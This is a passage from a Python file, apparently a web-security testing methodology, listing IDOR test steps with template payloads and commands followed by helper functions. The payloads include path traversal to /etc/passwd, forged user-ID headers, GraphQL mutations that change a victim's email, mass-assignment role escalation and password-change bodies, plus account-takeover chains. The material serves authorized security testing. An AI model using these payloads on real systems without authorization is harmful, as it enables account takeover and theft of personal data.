                "Also try known naming patterns: /uploads/USER_ID/photo.jpg."
            ),
            "payloads": [
                "../other_user/file.pdf",
                "../../etc/passwd",
                "1/profile.jpg",
                "2/profile.jpg",
                "admin/secrets.txt",
            ],
        },
        {
            "id": "idor_07",
            "name": "IDOR via email / username as reference",
            "detail": (
                "Endpoints using email or username as identifier: "
                "/api/profile?email=victim@ex.com "
                "May expose another user's data. Test by substituting "
                "a known victim email for your own."
            ),
        },
        {
            "id": "idor_08",
            "name": "Horizontal IDOR — read another user's data",
            "detail": (
                "Access or download another user's: profile, orders, messages, "
                "invoices, reports, audit logs. Test GET requests to all "
                "resource endpoints with victim's object IDs."
            ),
        },
        {
            "id": "idor_09",
            "name": "Vertical IDOR — access admin/higher-privilege resources",
            "detail": (
                "Access admin-only resources by using admin object IDs: "
                "/api/admin/users/1, /api/admin/settings, "
                "or by accessing endpoints that require admin role "
                "using a regular user session."
            ),
        },
        {
            "id": "idor_10",
            "name": "IDOR via POST/PUT/DELETE — write access",
            "detail": (
                "Test IDOR on all HTTP methods: "
                "PUT /api/user/VICTIM_ID — update victim's data, "
                "DELETE /api/resource/VICTIM_ID — delete victim's resource, "
                "POST /api/admin/users — create admin user, "
                "PATCH /api/settings/VICTIM_ID — modify victim's settings."
            ),
        },
        {
            "id": "idor_11",
            "name": "IDOR in request headers (e.g., X-User-ID)",
            "detail": (
                "Some APIs trust a X-User-ID or X-Account-ID header. "
                "Modify this header to another user's ID. "
                "Also check if user ID is embedded in JWT but a separate "
                "header parameter overrides it."
            ),
            "commands": [
                "curl -H 'X-User-ID: 1' -H 'Authorization: Bearer YOUR_TOKEN' https://TARGET/api/profile",  # gitleaks:allow
                "curl -H 'X-Account-ID: VICTIM_ID' https://TARGET/api/data",
            ],
        },
        {
            "id": "idor_12",
            "name": "IDOR in batch / bulk endpoints",
            "detail": (
                "Batch API endpoints (GET /api/users?ids=1,2,3 or POST with an array) "
                "may return data for all requested IDs without per-ID authorization. "
                "Test by adding victim IDs to batch requests."
            ),
            "payloads": [
                '{"ids": [1, 2, 3, VICTIM_ID]}',
                "?ids=1,2,3,VICTIM_ID",
                '{"user_ids": ["me", "VICTIM_ID"]}',
            ],
        },
        {
            "id": "idor_13",
            "name": "IDOR in export / download features",
            "detail": (
                "Export endpoints (CSV, PDF, ZIP) often have weaker authorization. "
                "Test: GET /api/export?user_id=VICTIM, "
                "GET /reports/VICTIM_ID/annual.pdf, "
                "POST /export with body {user_id: VICTIM}."
            ),
        },
        {
            "id": "idor_14",
            "name": "GraphQL IDOR — query with other user's IDs",
            "detail": (
                "GraphQL resolvers often rely on the ID passed in the query, "
                "not the authenticated user's ID. "
                "Test: query { user(id: VICTIM_ID) { email, profile } } "
                "Also test mutations: updateUser(id: VICTIM_ID, data: {...})"
            ),
            "payloads": [
                '{"query":"{ user(id: VICTIM_ID) { id email firstName lastName } }"}',
                '{"query":"mutation { updateUser(id: VICTIM_ID, email: \\"attacker@evil.com\\") { id } }"}',
                '{"query":"{ orders(userId: VICTIM_ID) { id total items { name } } }"}',
            ],
        },
        {
            "id": "idor_15",
            "name": "Mass assignment leading to IDOR / privilege escalation",
            "detail": (
                "POST/PUT endpoints may accept extra fields and bind them to "
                "the model. Inject: role, is_admin, user_id, account_id, "
                "balance, credit. If accepted and reflected, it's mass assignment."
            ),
            "payloads": [
                '{"username":"me","email":"me@ex.com","role":"admin"}',
                '{"name":"update","is_admin":true}',
                '{"data":"x","user_id":VICTIM_ID}',
                '{"balance":999999}',
                '{"verified":true,"premium":true}',
            ],
        },
        {
            "id": "idor_16",
            "name": "Chained IDOR — combine multiple IDORs for ATO",
            "detail": (
                "Chain IDORs for Account Takeover: "
                "(1) IDOR to read victim's email, "
                "(2) Trigger password reset for that email, "
                "(3) IDOR to read reset token (if stored and accessible), "
                "(4) Reset victim's password. "
                "Or: IDOR to change email → password reset to new email → account takeover."
            ),
        },
        {
            "id": "idor_17",
            "name": "Blind IDOR — side-channel detection",
            "detail": (
                "If no data is returned (write-only IDOR), detect success via: "
                "(1) Error message difference (own vs others' IDs), "
                "(2) Timing difference (auth check is faster on non-existent IDs), "
                "(3) Side effects (email sent to victim confirms IDOR worked), "
                "(4) Monitoring victim account (if you control it) for changes."
            ),
        },
        {
            "id": "idor_18",
            "name": "IDOR in password change endpoint",
            "detail": (
                "POST /api/change-password — test if user_id or account_id parameter "
                "is accepted and allows changing another user's password without "
                "knowing the old password."
            ),
            "payloads": [
                '{"user_id": VICTIM_ID, "new_password": "Hacked123!"}',
                '{"account": "VICTIM_EMAIL", "password": "Hacked123!"}',
            ],
        },
        {
            "id": "idor_19",
            "name": "Automated IDOR testing with Autorize",
            "detail": (
                "Install Autorize Burp extension. Set low-privilege account's "
                "session in Autorize. Browse app as high-privilege user — "
                "Autorize automatically replays every request with the "
                "low-privilege session and flags IDOR findings."
            ),
            "commands": [
                "# Burp → Extender → BApp Store → Install Autorize",
                "# Set victim session cookie in Autorize",
                "# Browse as admin — Autorize auto-tests all endpoints",
            ],
        },
        {
            "id": "idor_20",
            "name": "IDOR in API versioning — older versions lack auth",
            "detail": (
                "Try older API versions (/api/v1/ vs /api/v2/) — older versions "
                "sometimes have weaker authorization logic. "
                "Also try /api/v1/admin/ paths."
            ),
            "commands": [
                "ffuf -u https://TARGET/api/FUZZ/user/123 -w api_versions.txt -mc 200",
                "# api_versions.txt: v1, v2, v3, v0, 1, 2, old, beta, internal",
            ],
        },
        {
            "id": "idor_21",
            "name": "IDOR in websocket messages",
            "detail": (
                "WebSocket messages that reference object IDs may lack authorization. "
                "Intercept WebSocket frames in Burp, modify IDs, observe if "
                "other users' data is returned in the stream."
            ),
        },
        {
            "id": "idor_22",
            "name": "IDOR via parameter pollution",
            "detail": (
                "Some parsers use the last occurrence of a duplicated parameter. "
                "Test: GET /api/user?id=YOUR_ID&id=VICTIM_ID. "
                "Or reverse: GET /api/user?id=VICTIM_ID&id=YOUR_ID."
            ),
            "payloads": [
                "?id=YOUR_ID&id=VICTIM_ID",
                "?user_id=VICTIM_ID&user_id=YOUR_ID",
            ],
        },
        {
            "id": "idor_23",
            "name": "Object reference in JWT claims vs URL parameter",
            "detail": (
                "If the JWT contains user_id=123 but the URL also has ?user_id=456, "
                "test which the server honours. If the URL param takes precedence "
                "over the JWT claim, it is a critical IDOR."
            ),
        },
        {
            "id": "idor_24",
            "name": "IDOR impact escalation — demonstrate full ATO",
            "detail": (
                "For maximum severity, demonstrate: "
                "(1) Reading victim PII (full name, SSN, DOB, payment info), "
                "(2) Modifying victim account (email, password), "
                "(3) Deleting victim resources, "
                "(4) Full account takeover chain."
            ),
        },
    ],
},

}  # end VULN_METHODOLOGIES


# ─────────────────────────────────────────────────────────────────────────────
# Helper: retrieve steps for a given vuln class
# ─────────────────────────────────────────────────────────────────────────────

def get_methodology(vuln_class: str) -> dict:
    """
    Return the full methodology dict for a vulnerability class.

    Args:
        vuln_class: One of 'xss', 'ssrf', 'cors', 'jwt', 'auth', 'idor'.

    Returns:
        dict with keys: title, wstg_ids, tools, steps
    """
    return VULN_METHODOLOGIES.get(vuln_class.lower(), {})


def get_steps(vuln_class: str) -> list[dict]:
    """Return just the ordered list of testing steps."""
    return get_methodology(vuln_class).get("steps", [])


def list_vuln_classes() -> list[str]:
    """Return all available vulnerability class keys."""
    return list(VULN_METHODOLOGIES.keys())


if __name__ == "__main__":
    import json
    for k, v in VULN_METHODOLOGIES.items():
        print(f"\n{'='*60}")
        print(f"  {v['title']} — {len(v['steps'])} steps")
        print(f"  WSTG: {', '.join(v['wstg_ids'])}")
        print(f"  Tools: {', '.join(v['tools'])}")
